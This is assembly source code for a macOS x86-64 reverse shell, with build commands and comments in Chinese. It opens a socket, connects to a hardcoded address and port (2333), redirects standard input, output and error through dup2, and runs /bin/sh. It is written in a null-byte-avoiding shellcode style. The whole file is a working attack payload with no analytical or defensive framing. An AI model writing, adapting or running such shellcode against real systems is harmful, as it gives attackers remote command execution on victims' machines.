; nasm -f macho64 reverse_shell.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o reverse_shell reverse_shell.o 

BITS        64
global      _main

section     .text
_main:
    ; socket
    xor     rax, rax
    mov     al, 0x2          ; rax=0x2
    ror     rax, 0x28        ; 左移 rax=0x2000000
    mov     al, 0x61         ; rax=socket
    mov     r8, rax   

    xor     rdx, rdx        ; rdx = IPPROTO_IP(0)
    mov     rsi, rdx
    inc     rsi             ; rsi = SOCK_STREAM(1)
    mov     rdi, rsi        ;
    inc     rdi             ; rdi = AF_INET(2)
    syscall                 ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    mov     r12, rax        ; r12 = sfd

    ; sockaddr
    ; ip = 0.0.0.0 port = 2333 family = 2
    xor     r13, r13
    xor     r9, r9
    add     r13, 0x1D090101
    mov     r9b, 0xFF
    sub     r13, r9

    push    r13
    mov     r13, rsp

    ; connect
    inc     r8
    mov     rax, r8         ; rax = connect
    mov     rdi, r12        ; rdi = sfd
    mov     rsi, r13        ; rsi = sockaddr
    add     rdx, 0x10       ; rdx = len(sockaddr_in) = 16
    syscall

    ; dup
    sub     r8, 0x8
    xor     rsi, rsi
    ; dup2(cfd, 0);
    ; dup2(cfd, 1);
    ; dup2(cfd, 2);
dup:
    mov     rax, r8                 ; rax = dup2
    mov     rdi, r12                ; rdi = cfd
    syscall                         ; dup2(cfd, rsi)
    
    cmp     rsi, 0x2                ; 是否小与2 ----
    inc     rsi                     ; rsi ++       |
    jbe     dup                     ; 是跳转dup<----

    ; exec
    sub     r8, 0x1F
    mov     rax, r8
    xor     rdx, rdx
    xor     rsi, rsi
    mov     r13, '//bin/sh'
    shr     r13, 8
    push    r13
    mov     rdi, rsp        ; rdi = '//bin/sh'
    syscall